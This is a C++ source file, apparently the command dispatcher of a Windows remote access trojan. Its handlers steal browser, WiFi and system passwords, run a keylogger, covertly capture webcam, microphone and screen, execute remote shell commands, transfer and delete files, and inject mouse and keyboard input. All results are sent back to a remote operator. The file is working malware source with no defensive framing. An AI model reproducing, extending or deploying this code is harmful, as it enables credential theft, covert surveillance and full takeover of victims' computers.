#include "command_handler.h"
#include "../utils/logger.h"
#include "../modules/password_stealer.h"
#include "../modules/screenshot.h"
#include "../modules/keylogger.h"
#include "../modules/remote_desktop.h"
#include "../commands/system_commands.h"
#include "../commands/shell_commands.h"
#include "../commands/file_commands.h"
#include "../modules/webcam.h"
#include "../modules/microphone.h"
#include <windows.h>
#include <sstream>
#include <cstdlib>
#include <cstdio>
#include <thread>
#include <chrono>
#include <fstream>
#include <vector>
#include <cstdint>

// ==================== UPLOAD STATE ====================
static std::string g_pending_upload_path;
static std::string g_pending_upload_data;
static bool        g_upload_active = false;

// ==================== BASE64 ====================
static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string b64_encode(const std::string& in) {
    std::string out;
    out.reserve(((in.size() + 2) / 3) * 4);
    const unsigned char* d = (const unsigned char*)in.data();
    size_t i = 0;
    for (; i + 2 < in.size(); i += 3) {
        uint32_t v = (d[i] << 16) | (d[i+1] << 8) | d[i+2];
        out += B64_TABLE[(v >> 18) & 63];
        out += B64_TABLE[(v >> 12) & 63];
        out += B64_TABLE[(v >>  6) & 63];
        out += B64_TABLE[ v        & 63];
    }
    if (i < in.size()) {
        uint32_t v = d[i] << 16;
        int rem = (int)(in.size() - i);
        if (rem == 2) v |= d[i+1] << 8;
        out += B64_TABLE[(v >> 18) & 63];
        out += B64_TABLE[(v >> 12) & 63];
        out += (rem == 2) ? B64_TABLE[(v >> 6) & 63] : '=';
        out += '=';
    }
    return out;
}

static std::string b64_decode(const std::string& in) {
    static const std::string T =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int buf[4], k = 0;
    for (char c : in) {
        if (c == '=') break;
        size_t v = T.find(c);
        if (v == std::string::npos) continue;
        buf[k++] = (int)v;
        if (k == 4) {
            out += (char)((buf[0] << 2) | (buf[1] >> 4));
            out += (char)(((buf[1] & 0x0F) << 4) | (buf[2] >> 2));
            out += (char)(((buf[2] & 0x03) << 6) | buf[3]);
            k = 0;
        }
    }
    if (k == 2) out += (char)((buf[0] << 2) | (buf[1] >> 4));
    else if (k == 3) {
        out += (char)((buf[0] << 2) | (buf[1] >> 4));
        out += (char)(((buf[1] & 0x0F) << 4) | (buf[2] >> 2));
    }
    return out;
}

// ==================== CONSTRUCTOR ====================
CommandHandler::CommandHandler(Connection* conn) : connection(conn) {
    register_commands();
}

void CommandHandler::register_commands() {
    commands["system"]     = std::bind(&CommandHandler::handle_system_command,     this, std::placeholders::_1);
    commands["steal"]      = std::bind(&CommandHandler::handle_steal_command,      this, std::placeholders::_1);
    commands["file"]       = std::bind(&CommandHandler::handle_file_command,       this, std::placeholders::_1);
    commands["shell"]      = std::bind(&CommandHandler::handle_shell_command,      this, std::placeholders::_1);
    commands["screenshot"] = std::bind(&CommandHandler::handle_screenshot_command, this, std::placeholders::_1);
    commands["keylog"]     = std::bind(&CommandHandler::handle_keylog_command,     this, std::placeholders::_1);
    commands["webcam"]     = std::bind(&CommandHandler::handle_webcam_command,     this, std::placeholders::_1);
    commands["microphone"] = std::bind(&CommandHandler::handle_microphone_command, this, std::placeholders::_1);

    commands["rd_start"]    = std::bind(&CommandHandler::handle_rd_start,    this, std::placeholders::_1);
    commands["rd_stop"]     = std::bind(&CommandHandler::handle_rd_stop,     this, std::placeholders::_1);
    commands["rd_frame"]    = std::bind(&CommandHandler::handle_rd_frame,    this, std::placeholders::_1);
    commands["rd_settings"] = std::bind(&CommandHandler::handle_rd_settings, this, std::placeholders::_1);

    commands["fdownload"] = std::bind(&CommandHandler::handle_fdownload, this, std::placeholders::_1);
    commands["fupload"]   = std::bind(&CommandHandler::handle_fupload,   this, std::placeholders::_1);

    commands["mouse"]    = std::bind(&CommandHandler::handle_mouse_command,    this, std::placeholders::_1);
    commands["keyboard"] = std::bind(&CommandHandler::handle_keyboard_command, this, std::placeholders::_1);

    Logger::getInstance().log("Commands registered.");
}

// ==================== SYSTEM ====================
bool CommandHandler::handle_system_command(const std::string& args) {
    Logger::getInstance().log("System command: " + args);
    std::string result = SystemCommands::get_system_info();
    if (connection) connection->send_data("SYSTEM_INFO|" + result);
    return true;
}

// ==================== FILE ====================
bool CommandHandler::handle_file_command(const std::string& args) {
    Logger::getInstance().log("File command: " + args);

    std::stringstream ss(args);
    std::string op, path, dest;
    ss >> op >> path >> dest;

    if (op.empty() || path.empty()) {
        if (connection) connection->send_data("FILE_ERR|usage: file <op> <path> [dest]");
        return false;
    }

    std::string result = "FILE_OK";

    if (op == "list") {
        std::vector<std::string> files;
        if (FileCommands::list_directory(path, files)) {
            std::stringstream out;
            out << "FILE_LIST|";
            for (size_t i = 0; i < files.size(); i++) {
                out << files[i];
                if (i + 1 < files.size()) out << "\n";
            }
            result = out.str();
        } else {
            result = "FILE_ERR|list failed";
        }
    } else if (op == "delete") {
        result = FileCommands::delete_file(path) ? "FILE_OK|deleted" : "FILE_ERR|delete failed";
    } else if (op == "copy" && !dest.empty()) {
        result = FileCommands::copy_file(path, dest) ? "FILE_OK|copied" : "FILE_ERR|copy failed";
    } else if (op == "move" && !dest.empty()) {
        result = FileCommands::move_file(path, dest) ? "FILE_OK|moved" : "FILE_ERR|move failed";
    } else if (op == "mkdir") {
        result = FileCommands::create_directory(path) ? "FILE_OK|created" : "FILE_ERR|mkdir failed";
    } else if (op == "rmdir") {
        result = FileCommands::delete_directory(path) ? "FILE_OK|removed" : "FILE_ERR|rmdir failed";
    } else {
        result = "FILE_ERR|unknown op";
    }

    if (connection) connection->send_data(result);
    return true;
}

// ==================== SHELL ====================
bool CommandHandler::handle_shell_command(const std::string& args) {
    Logger::getInstance().log("Shell command: " + args);
    std::string result = ShellCommands::execute_command(args);
    if (connection) connection->send_data("SHELL_OUTPUT|" + result);
    return true;
}

// ==================== SCREENSHOT ====================
bool CommandHandler::handle_screenshot_command(const std::string& args) {
    Logger::getInstance().log("Screenshot command");
    ScreenshotModule ss;
    std::vector<uint8_t> image = ss.capture();
    if (!image.empty() && connection) {
        connection->send_data("SCREENSHOT:" + std::to_string(image.size()));
        connection->send_data(std::string(image.begin(), image.end()));
    } else if (connection) {
        connection->send_data("SCREENSHOT_ERR|empty capture");
    }
    return true;
}

// ==================== KEYLOG ====================
bool CommandHandler::handle_keylog_command(const std::string& args) {
    Logger::getInstance().log("Keylog command: " + args);
    static KeyloggerModule kl;

    if (args == "start") {
        kl.start();
        if (connection) connection->send_data("KEYLOG_OK|started");
    } else if (args == "stop") {
        kl.stop();
        if (connection) connection->send_data("KEYLOG_OK|stopped");
    } else if (args == "get") {
        std::string keys = kl.get_logs();
        if (connection) connection->send_data("KEYLOG|" + keys);
    } else {
        if (connection) connection->send_data("KEYLOG_ERR|usage: keylog start|stop|get");
    }
    return true;
}

// ==================== WEBCAM ====================
bool CommandHandler::handle_webcam_command(const std::string& args) {
    Logger::getInstance().log("Webcam command: " + args);
    if (!connection) return false;

    WebcamModule cam;
    if (!cam.initialize()) {
        connection->send_data("WEBCAM_ERR|init failed");
        return false;
    }

    std::vector<uint8_t> jpeg;
    if (!cam.capture_frame(jpeg, 80)) {
        connection->send_data("WEBCAM_ERR|capture failed (no device or busy)");
        cam.shutdown();
        return false;
    }

    // Header with size, then body (base64 to survive text framing)
    std::string b64 = b64_encode(std::string(jpeg.begin(), jpeg.end()));
    std::string msg = "WEBCAM_DATA|" + std::to_string(jpeg.size()) + "|" + b64;
    connection->send_data(msg);
    cam.shutdown();
    return true;
}

// ==================== MICROPHONE ========================

bool CommandHandler::handle_microphone_command(const std::string& args) {
    Logger::getInstance().log("Microphone command: " + args);
    if (!connection) return false;

    int seconds = 5;
    if (!args.empty()) {
        try { seconds = std::stoi(args); } catch (...) {}
        if (seconds < 1 || seconds > 30) seconds = 5;
    }

    MicrophoneModule mic;
    if (!mic.initialize()) {
        connection->send_data("MICROPHONE_ERR|init failed");
        return false;
    }

    std::vector<uint8_t> wav;
    if (!mic.record_wav(wav, seconds)) {
        connection->send_data("MICROPHONE_ERR|record failed (no device)");
        mic.shutdown();
        return false;
    }

    std::string b64 = b64_encode(std::string(wav.begin(), wav.end()));
    std::string msg = "MICROPHONE_DATA|" + std::to_string(wav.size()) + "|" + b64;
    connection->send_data(msg);
    mic.shutdown();
    return true;
}

// ==================== REMOTE DESKTOP ====================
static RemoteDesktop* g_rd_instance = nullptr;
static RemoteDesktop& get_rd_instance() {
    if (!g_rd_instance) g_rd_instance = new RemoteDesktop();
    return *g_rd_instance;
}

bool CommandHandler::handle_rd_start(const std::string& args) {
    Logger::getInstance().log("Remote desktop start requested");
    auto& rd = get_rd_instance();
    std::thread([this, &rd]() {
        rd.start_streaming([this](const std::vector<uint8_t>& jpeg) {
            if (!connection || !connection->is_connected()) return;
            std::string b64 = b64_encode(std::string(jpeg.begin(), jpeg.end()));
            std::string msg = "RDFRAME|" + std::to_string(jpeg.size()) +
                              "|" + b64;
            connection->send_data(msg);
        });
    }).detach();
    if (connection) connection->send_data("RD_OK|streaming started");
    return true;
}

bool CommandHandler::handle_rd_stop(const std::string& args) {
    Logger::getInstance().log("Remote desktop stop requested");
    auto& rd = get_rd_instance();
    rd.stop_streaming();
    if (connection) connection->send_data("RD_OK|streaming stopped");
    return true;
}

bool CommandHandler::handle_rd_frame(const std::string& args) {
    Logger::getInstance().log("Remote desktop single frame requested");
    auto& rd = get_rd_instance();
    std::vector<uint8_t> jpeg = rd.capture_frame();
    if (!jpeg.empty() && connection) {
        std::string b64 = b64_encode(std::string(jpeg.begin(), jpeg.end()));
        std::string msg = "RDFRAME|" + std::to_string(jpeg.size()) +
                          "|" + b64;
        connection->send_data(msg);
    } else if (connection) {
        connection->send_data("RD_ERR|no frame");
    }
    return true;
}

bool CommandHandler::handle_rd_settings(const std::string& args) {
    Logger::getInstance().log("Remote desktop settings: " + args);
    auto& rd = get_rd_instance();
    std::stringstream ss(args);
    std::string token;
    while (ss >> token) {
        if (token.find("fps=") == 0) {
            try {
                int fps = std::stoi(token.substr(4));
                rd.set_fps(fps);
                if (connection) connection->send_data("RD_OK|fps=" + std::to_string(fps));
            } catch (...) {}
        } else if (token.find("quality=") == 0) {
            try {
                int q = std::stoi(token.substr(8));
                rd.set_quality(q);
                if (connection) connection->send_data("RD_OK|quality=" + std::to_string(q));
            } catch (...) {}
        }
    }
    return true;
}

// ==================== MOUSE ====================
// MOUSE <x_pct> <y_pct> <button> <wheel>
// button: 0=none, 1=left, 2=right, 3=middle
// wheel:  positive=up, negative=down (multiples of 120)
bool CommandHandler::handle_mouse_command(const std::string& args) {
    int x_pct = 50, y_pct = 50, btn = 0, wheel = 0;
    if (sscanf(args.c_str(), "%d %d %d %d", &x_pct, &y_pct, &btn, &wheel) != 4)
        return false;

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int sx = (sw * x_pct) / 100;
    int sy = (sh * y_pct) / 100;
    if (sx < 0) sx = 0; else if (sx >= sw) sx = sw - 1;
    if (sy < 0) sy = 0; else if (sy >= sh) sy = sh - 1;

    SetCursorPos(sx, sy);

    INPUT in = {0};
    in.type = INPUT_MOUSE;

    if (btn == 1) {
        in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;   SendInput(1, &in, sizeof(in));
        in.mi.dwFlags = MOUSEEVENTF_LEFTUP;     SendInput(1, &in, sizeof(in));
    } else if (btn == 2) {
        in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;  SendInput(1, &in, sizeof(in));
        in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;    SendInput(1, &in, sizeof(in));
    } else if (btn == 3) {
        in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN; SendInput(1, &in, sizeof(in));
        in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;   SendInput(1, &in, sizeof(in));
    }

    if (wheel != 0) {
        INPUT wi = {0};
        wi.type = INPUT_MOUSE;
        wi.mi.mouseData = (DWORD)wheel;
        wi.mi.dwFlags = MOUSEEVENTF_WHEEL;
        SendInput(1, &wi, sizeof(wi));
    }

    if (connection) connection->send_data("MOUSE_OK");
    return true;
}

// ==================== KEYBOARD ====================
// KEYBOARD <vk_code> <down>
// vk_code: Windows virtual key code (e.g. 65 = 'A', 13 = Enter, 8 = Backspace)
// down:    1 = key press, 0 = key release
bool CommandHandler::handle_keyboard_command(const std::string& args) {
    int vk = 0, down = 0;
    if (sscanf(args.c_str(), "%d %d", &vk, &down) != 2)
        return false;

    INPUT in = {0};
    in.type       = INPUT_KEYBOARD;
    in.ki.wVk     = (WORD)vk;
    in.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
    SendInput(1, &in, sizeof(in));

    if (connection) connection->send_data("KEYBOARD_OK");
    return true;
}

// ==================== FILE DOWNLOAD ====================
bool CommandHandler::handle_fdownload(const std::string& args) {
    if (args.empty() || !connection) return false;

    std::string path = args;
    std::ifstream f(path, std::ios::binary);
    if (!f) {
        connection->send_data("FDOWNLOAD_ERR|open failed: " + path);
        return false;
    }

    f.seekg(0, std::ios::end);
    uint64_t total_size = (uint64_t)f.tellg();
    f.seekg(0, std::ios::beg);

    connection->send_data("FDOWNLOAD|" + path + "|" + std::to_string(total_size));

    const size_t CHUNK = 512 * 1024;
    std::vector<char> buf(CHUNK);
    uint32_t index = 0;

    while (f) {
        f.read(buf.data(), CHUNK);
        std::streamsize got = f.gcount();
        if (got <= 0) break;
        std::string chunk_str(buf.data(), (size_t)got);
        std::string b64 = b64_encode(chunk_str);
        std::string msg = "FCHUNK|" + std::to_string(index) + "|" +
                          std::to_string((int)got) + "|" + b64;
        connection->send_data(msg);
        index++;
    }

    connection->send_data("FDOWNLOAD_DONE|" + std::to_string(index));
    return true;
}

// ==================== FILE UPLOAD ====================
bool CommandHandler::handle_fupload(const std::string& args) {
    if (args.empty() || !connection) return false;
    g_pending_upload_path = args;
    g_pending_upload_data.clear();
    g_upload_active = true;
    connection->send_data("FUPLOAD_READY|" + args);
    return true;
}

//=======================Password Stealer==============
bool CommandHandler::handle_steal_command(const std::string& args) {
    Logger::getInstance().log("Steal command: " + args);
    if (!connection) return false;

    PasswordStealer ps;
    std::string output;

    if (args == "passwords" || args == "all") {
        ps.StealBrowserPasswords();
        ps.StealWiFiPasswords();
        ps.StealSystemCredentials();
        output = ps.GetFormattedOutput();
    } else if (args == "wifi") {
        ps.StealWiFiPasswords();
        output = ps.GetFormattedOutput();
    } else if (args == "browser") {
        ps.StealBrowserPasswords();
        output = ps.GetFormattedOutput();
    } else {
        connection->send_data("STEAL_ERR|usage: steal passwords|wifi|browser|all");
        return false;
    }

    connection->send_data("STEAL_OUTPUT|" + output);
    return true;
}
// ==================== DISPATCH ====================
bool CommandHandler::execute_command(const std::string& command) {
    size_t space = command.find(' ');
    std::string cmd = (space == std::string::npos) ? command : command.substr(0, space);
    std::string args = (space != std::string::npos) ? command.substr(space + 1) : "";

    auto it = commands.find(cmd);
    if (it != commands.end()) {
        return it->second(args);
    }
    Logger::getInstance().log("Unknown command: " + cmd);
    if (connection) connection->send_data("ERROR|unknown command: " + cmd);
    return false;
}

// ==================== MAIN LOOP ====================
void CommandHandler::process_commands() {
    if (!connection) return;

    std::string cmd;
    if (!connection->receive_data(cmd)) return;

    if (g_upload_active) {
        if (cmd.rfind("FUPLOAD_CHUNK|", 0) == 0) {
            size_t p1 = cmd.find('|', 14);
            size_t p2 = (p1 == std::string::npos) ? std::string::npos : cmd.find('|', p1 + 1);
            if (p2 == std::string::npos) return;
            std::string b64 = cmd.substr(p2 + 1);
            g_pending_upload_data += b64_decode(b64);
            return;
        }
        if (cmd.rfind("FUPLOAD_DONE|", 0) == 0) {
            std::ofstream out(g_pending_upload_path, std::ios::binary);
            if (out) {
                out.write(g_pending_upload_data.data(),
                          (std::streamsize)g_pending_upload_data.size());
                out.close();
                connection->send_data("FUPLOAD_OK|" +
                    std::to_string(g_pending_upload_data.size()));
            } else {
                connection->send_data("FUPLOAD_ERR|write failed");
            }
            g_pending_upload_data.clear();
            g_upload_active = false;
            return;
        }
    }

    execute_command(cmd);
}